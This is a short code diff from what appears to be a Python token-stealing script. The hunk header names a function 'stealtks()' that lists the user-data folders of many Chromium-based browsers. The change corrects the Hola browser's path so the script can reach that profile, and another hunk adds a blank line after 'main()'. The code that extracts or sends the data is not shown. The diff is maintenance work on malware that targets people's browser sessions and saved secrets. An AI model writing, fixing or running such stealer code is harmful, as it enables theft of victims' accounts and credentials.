@@ -274,7 +274,7 @@ def stealtks():
     '0Thorium': os.path.join(local, 'Thorium', 'User Data'),
     '0Cromite': os.path.join(local, 'Cromite', 'User Data'),
     '0CocCoc': os.path.join(local, 'CocCoc', 'Browser', 'User Data'),
-    '0Hola': os.path.join(appdata, 'Hola', 'chromium_profile'),
+    '0Hola': os.path.join(roaming, 'Hola', 'chromium_profile'),
     '0Iridium': os.path.join(local, "Iridium", "User Data"),
     '0Vivaldi': os.path.join(local, 'Vivaldi', 'User Data'),
     '0Yandex': os.path.join(local, 'Yandex', 'YandexBrowser', 'User Data'),
@@ -405,6 +405,7 @@ def main():
         
 
 main()
+
 
 
 
